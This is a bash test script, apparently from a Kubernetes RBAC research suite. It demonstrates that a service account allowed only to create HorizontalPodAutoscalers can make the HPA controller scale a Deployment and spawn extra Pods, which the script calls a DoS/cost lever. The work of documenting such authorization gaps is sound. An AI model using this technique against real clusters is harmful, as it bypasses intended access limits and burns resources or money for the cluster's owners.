#!/usr/bin/env bash
# Implicit permission: create HorizontalPodAutoscaler -> patch Deployment/scale   (hpa-scales-deployment)
#
# Proof: an identity granted ONLY `create horizontalpodautoscalers`
# (autoscaling/v2) cannot `update deployments/scale` and cannot `create pods`,
# yet when it creates an HPA with minReplicas=2 pointed at a replicas=1
# Deployment, the HPA controller in kube-controller-manager enforces
# minReplicas by writing the target's /scale subresource -- scaling the
# Deployment to 2 and making the controllers stamp Pods on the attacker's
# behalf. No metrics-server is needed: minReplicas is a floor the controller
# enforces unconditionally. A DoS/cost lever on any scalable workload.
# Mechanism: ../transitions/hpa-scales-workloads.md
#            ../transitions/hpa-scales-deployment.json
source "$(dirname "$0")/../lib.sh"
test_start "hpa-scales-deployment"

ns="$(new_ns hpa-deploy)"

# Pre-existing state: admin creates the workload at replicas=1 (busybox).
step "admin creates a Deployment at replicas=1"
K -n "$ns" apply -f - >/dev/null <<EOF || fail "could not create deployment"
apiVersion: apps/v1
kind: Deployment
metadata: { name: target, labels: { app: target } }
spec:
  replicas: 1
  selector: { matchLabels: { app: target } }
  template:
    metadata: { labels: { app: target } }
    spec:
      automountServiceAccountToken: false
      containers:
      - name: c
        image: ${IMG}
        imagePullPolicy: IfNotPresent
        command: ["sh","-c","sleep 3600"]
EOF
wait_exists "$ns" pods "app=target" 90
one="$(K -n "$ns" get pods -l app=target --no-headers | wc -l)"
assert_eq "$one" "1" "deployment starts at exactly one Pod"

mk_sa "$ns" attacker
# ONLY create HPAs (+read to observe). Deliberately NO scale write, NO pods write,
# NO parent deployment write.
grant_ns "$ns" attacker "autoscaling" "horizontalpodautoscalers" "create,get,list"
grant_ns "$ns" attacker "apps" "deployments,replicasets" "get,list"
grant_ns "$ns" attacker "" "pods" "get,list"
subj="$(sa_subject "$ns" attacker)"

assert_can    "$subj" create horizontalpodautoscalers "$ns"   # sanity: holds p
assert_cannot "$subj" update deployments/scale        "$ns"   # THE GAP: cannot drive /scale directly
assert_cannot "$subj" create pods                     "$ns"   # cannot create pods directly
assert_cannot "$subj" patch  deployments              "$ns"   # cannot touch the parent spec

step "attacker creates an HPA (minReplicas=2) targeting the Deployment"
as_subj "$subj" -n "$ns" apply -f - >/dev/null <<EOF || fail "attacker could not create the HPA"
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata: { name: lever }
spec:
  scaleTargetRef: { apiVersion: apps/v1, kind: Deployment, name: target }
  minReplicas: 2
  maxReplicas: 5
EOF

# EFFECT: the HPA controller patches the target's /scale (q) the attacker could
# not patch directly; spec.replicas goes 1 -> 2 and extra Pods appear.
step "waiting (up to 120s) for the HPA controller to enforce minReplicas on /scale"
scaled=0
for _ in $(seq 1 120); do
  r="$(K -n "$ns" get deploy target -o jsonpath='{.spec.replicas}' 2>/dev/null)"
  [ "${r:-0}" -ge 2 ] && { scaled=1; break; }
  sleep 1
done
[ "$scaled" = 1 ] || fail "deployment spec.replicas did not reach >=2 (saw $(K -n "$ns" get deploy target -o jsonpath='{.spec.replicas}'); HPA conds: $(K -n "$ns" get hpa lever -o jsonpath='{range .status.conditions[*]}{.type}={.status};{end}'))"

step "waiting for the Pod count to converge to >=2"
converged=0
for _ in $(seq 1 90); do
  n="$(K -n "$ns" get pods -l app=target --no-headers 2>/dev/null | wc -l)"
  [ "${n:-0}" -ge 2 ] && { converged=1; break; }
  sleep 1
done
[ "$converged" = 1 ] || fail "pods did not reach >=2 (saw $(K -n "$ns" get pods -l app=target --no-headers | wc -l))"

owner="$(K -n "$ns" get pods -l app=target -o jsonpath='{.items[0].metadata.ownerReferences[0].kind}')"
assert_eq "$owner" "ReplicaSet" "scaled Pods are controller-owned, not attacker-authored"
able="$(K -n "$ns" get hpa lever -o jsonpath='{range .status.conditions[?(@.type=="AbleToScale")]}{.status}{end}')"
step "HPA controller patched deployments/scale 1 -> $(K -n "$ns" get deploy target -o jsonpath='{.spec.replicas}') (AbleToScale=$able), creating $owner-owned Pods from only 'create horizontalpodautoscalers'"

test_pass
